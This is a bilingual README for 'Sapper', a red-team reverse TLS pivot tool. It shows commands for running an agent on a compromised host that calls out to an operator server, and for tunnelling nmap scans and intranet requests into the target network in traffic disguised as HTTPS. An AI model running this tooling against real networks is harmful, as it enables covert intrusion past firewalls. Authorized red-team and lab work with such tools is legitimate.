# Sapper

Reverse TLS pivot with SOCKS5 multiplexing. The agent dials out of the
compromised network to your server over one TLS connection; your tools talk
to a local SOCKS5 port and their traffic lands inside the target network.

[Русская версия ниже](#sapper-русская-версия)

## Why

Once you have a foothold, everything behind it opens up: scan internal
subnets, hit intranet services, pivot RDP/SSH - through one outbound TLS
connection that looks like boring HTTPS.

## How it works

```
your tools => socks5 :1080 => [TLS tunnel, multiplexed channels] => agent => internal targets
```

- One TLS connection carries any number of TCP streams (custom framing,
  channel IDs, OPEN/DATA/CLOSE).
- The agent dials **out**, so inbound firewall rules on the target network
  never come into play.
- PSK authentication on top of TLS (HMAC-SHA256 challenge/response).
- Optional server certificate pinning on the agent (`--pin sha256`).
- Reconnect with backoff if the tunnel drops.
- Self-signed cert is generated in memory on every server start - nothing to
  ship, nothing on disk.

## Build

```bash
cmake -B build && cmake --build build
```

Requires OpenSSL dev headers (`libssl-dev`).

## Usage

Operator side:

```bash
./build/sapper server --bind 0.0.0.0:8443 --socks 127.0.0.1:1080 --key s3cret
```

Compromised host:

```bash
./build/sapper agent 203.0.113.10:8443 --key s3cret
# pin the server cert for good measure (printed on first connect):
./build/sapper agent 203.0.113.10:8443 --key s3cret --pin daa852ab...
```

Use it:

```bash
proxychains -q nmap -sT -Pn 10.10.0.0/24
curl --socks5-hostname 127.0.0.1:1080 http://intranet.internal
```

Point `proxychains` at `127.0.0.1:1080` (socks5, no auth) and every tool you
wrap lands inside the target network.

## Legal

For authorized red team operations and lab use. Pivoting into networks you
do not own or lack written permission to test is illegal.

## License

MIT. Copyright (c) 2026 d3xm0s.

---

# Sapper (русская версия)

Реверсивный TLS-пивот с мультиплексированием SOCKS5. Агент сам дозванивается
из скомпрометированной сети до вашего сервера по одному TLS-соединению; ваши
инструменты ходят в локальный SOCKS5-порт, а трафик оказывается внутри
целевой сети.

## Зачем

После foothold открывается всё, что за ним: скан внутренних подсетей,
intranet-сервисы, пивот в RDP/SSH - через одно исходящее TLS-соединение,
которое выглядит как обычный HTTPS.

## Как работает

```
ваши тулзы => socks5 :1080 => [TLS-туннель, мультиплексные каналы] => агент => внутренние цели
```

- Одно TLS-соединение несёт любое число TCP-потоков (свой фрейминг,
  OPEN/DATA/CLOSE по channel id).
- Агент сам звонит **наружу** - входящие правила файрвола целевой сети не
  мешают.
- PSK-аутентификация поверх TLS (HMAC-SHA256 challenge/response).
- Опциональный пиннинг сертификата сервера на агенте (`--pin sha256`).
- Переподключение с backoff при обрыве.
- Сертификат self-signed генерируется в памяти при каждом старте сервера.

## Сборка

```bash
cmake -B build && cmake --build build
```

## Использование

```bash
./build/sapper server --bind 0.0.0.0:8443 --socks 127.0.0.1:1080 --key s3cret  # оператор
./build/sapper agent 203.0.113.10:8443 --key s3cret                           # хост
proxychains -q nmap -sT -Pn 10.10.0.0/24                                      # работа
```

## Юридическое

Только для авторизованных red team операций и лабораторий. Пивот в сети без
явного письменного разрешения незаконен.

## License

MIT. Copyright (c) 2026 d3xm0s.
